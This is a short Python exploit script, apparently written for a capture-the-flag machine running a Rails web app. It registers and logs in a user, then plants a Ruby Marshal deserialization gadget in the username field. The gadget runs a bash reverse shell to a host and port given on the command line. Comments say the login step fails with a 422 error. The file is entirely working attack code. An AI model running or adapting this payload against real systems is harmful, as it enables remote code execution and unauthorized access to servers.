import requests
import re
import sys

s = requests.Session()

URL='http://10.10.10.211:8080'

#greb token
get_signup = s.get(URL + '/signup')
grep_token = r'token" content="(.*)"'
csrf_token = re.search(grep_token,get_signup.text).group(1)

user='poorduck'
pw='password'
email='poorduck@kwakkwak.com'

#signup
data = {}
data['utf8'] = 'â'
data['authenticity_token'] = csrf_token
data['user[user]'] = user
data['user[email]'] = email
data['user[pw]'] = pw
data['commit'] = 'Create User'
s.post(URL + '/users', data=data)

#login
data = {}
data['utf8'] = 'â'
data['authenticity_token'] = csrf_token
data['session[email]'] = email
data['session[pw]'] = pw
data['commit'] = 'Log in'
login = s.post(URL + '/login', data=data)

#print(login.text)
#error - The change you wanted was rejected (422)
#this error brake the script
#need to find the solution for this error

#greb user_id
grep_uid = r'href="/users/(.*)"'
user_id = re.search(grep_uid,login.text).group(1)

payload = '%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22%3A%60bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F{}%2{}+0%3E%261%22%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T'.format(sys.argv[1], sys.argv[2])

#upload payload
data = {}
data['utf8'] = 'â'
data['authenticity_token'] = csrf_token
data['_method'] = 'patch'
data['user[user]'] = payload
data['commit'] = 'Update User'
s.post(URL + '/users/' + user_id, data=data)

#Execute payload
s.post(URL + '/users/' + user_id, data=data)
#s.get(URL + '/articles')
